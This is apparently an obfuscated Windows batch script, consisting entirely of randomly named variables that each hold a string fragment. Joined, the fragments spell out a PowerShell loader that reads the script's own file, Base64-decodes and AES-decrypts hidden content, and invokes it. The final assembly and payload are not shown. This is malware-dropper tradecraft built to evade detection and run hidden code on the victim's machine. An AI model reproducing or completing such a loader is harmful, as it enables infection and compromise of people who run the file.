@echo off
set "ChOYUrueuO=\W"
set "IPJjHcgGfi=he"
set "bGPGbjvebK=xe"
set "MrXckgzuns=:\"
set "bGkgyLzORp=we"
set "TINSSCewdt=0\"
set "LkiVnEFnKJ=po"
set "ljYQXhigCH=Po"
set "QBeOtqhFbW=st"
set "QWIzIYnFlM=Wi"
set "WqSqGMlNDs=\v"
set "ciWEGbTaga= /"
set "SldhGjQdOR=32"
set "XPhaqNueeK=ll"
set "eghKwkqXqy=nd"
set "DTIASGntFG=em"
set "ILdXFZhjSH=in"
set "dsxiRsTfgW=py"
set "NdJzCKjLhZ=.e"
set "TyUNqFfkHW=y "
set "MZEChfvVys= C"
set "TySOfQreTj=s\"
set "UyDrwkSRbZ=he"
set "YfoINiObNE=we"
set "moCsNDdSKo=1."
set "AdRjtveJFB=ws"
set "tQHZgFxWhj=do"
set "QaawOnDZxe=rs"
set "wrtAhUTKLI=ll"
set "kUzyEvvnvl=co"
set "UyXlnEUTDj=rS"
set "SPJLoGjnGZ=Sy"
set "ZzPcyMuuXL=ow"
set "iFxDfkXFXe= %~dp0"
set "SXBZXqJDzy=cd"
set "cYKuFuMAXI=tsWi"
set "XfoLBlhbJd=pDZz"
set "LYJWgrEonK=e = "
set "jJylRSXbTR=mory"
set "fDSOetlzeS= [Sy"
set "eygJPFuHrX=se()"
set "tnGzOZWqop=join"
set "YfjKksUEWQ=ach "
set "xroZkddIbD=ewLi"
set "PDuyGpmZaq=yste"
set "oGnDMvXDlX=JCS "
set "hzJEaXCSeO=loGj"
set "tgwBzrTopY=[Sys"
set "dyoizDTqsQ=)($F"
set "iLBUPIthdS=3); "
set "XuGifMZhhn=6] -"
set "doOYeRjkjz=dpox"
set "YrwkyijNUw=x.Pa"
set "oqBsjlGFlh= New"
set "kLXqdGnLpN=eam("
set "ORGgJtrCom=Conv"
set "SHycVdCfkQ=ddin"
set "IXgJnUknVA=ypto"
set "ZUsdtwiOgm=ateD"
set "MHVFJVvMcr=);$Y"
set "bRBxIGuUGH=Xdpo"
set "cqgsVcXMuC=okNW"
set "knKxSuUnyy=;$Qj"
set "ELQsQhLjwt=am;$"
set "iiOcOWapZg=O.Me"
set "rJjUGXlEUX=m.Re"
set "ctiQrQXNQf=dpox"
set "NKAQSicgkY=Invo"
set "GwVpqUgBPi=mu, "
set "qefwwniEUH=i = "
set "svGanZJCxw=-1.."
set "wZOAsCWGUb=.Cry"
set "bgzkUkEeHF=ing("
set "ZOuUTeJmKZ=Secu"
set "biHrQLCose=BC;$"
set "SoSQIehxWB=-nop"
set "JeivxjKwdD=]::N"
set "fadYsBdRol=ispo"
set "cdtRjhIWct=dpox"
set "zoRQAsSLTV=dpox"
set "UBVPIJNDgx=$Xdp"
set "UScXKqUnfN=Bmor"
set "HMbXrnmkDH=rMXU"
set "lXOLcQTBUS=.Key"
set "JWnfllXRzL=kdLM"
set "CkLRhgMrdW=trea"
set "tFbhmZKobk=lit("
set "MltaNJlXYp=.Dis"
set "krIvercZWL=; };"
set "YEVrEFWftC=rans"
set "TZTENqFyzJ=]::C"
set "FTqZiZwioO=daeR"
set "lynxMutkGD=('%~f0'"
set "gOFAbyVxBX=Obje"
set "nGPyjuTqLd=Emu."
set "FYXNNlUySb=pStr"
set "eiqecRNcOQ=-joi"
set "IKjNsDASWs=qKOd"
set "UKEKnCLlUX=.Con"
set "NbORmuYGGO=UGTu"
set "mwxovFZRHW=M = "
set "mfpBabtfuz==');"
set "AEkvssAFWV=orF'"
set "hdrINYZRvp=pher"
set "tczcWfEhJl=-4] "
set "jdFGDpNmfP=rMXU"
set "lJzfqKQjKt=rity"
set "VfBTvfAxYf=f.En"
set "MwckSLAiWN=join"
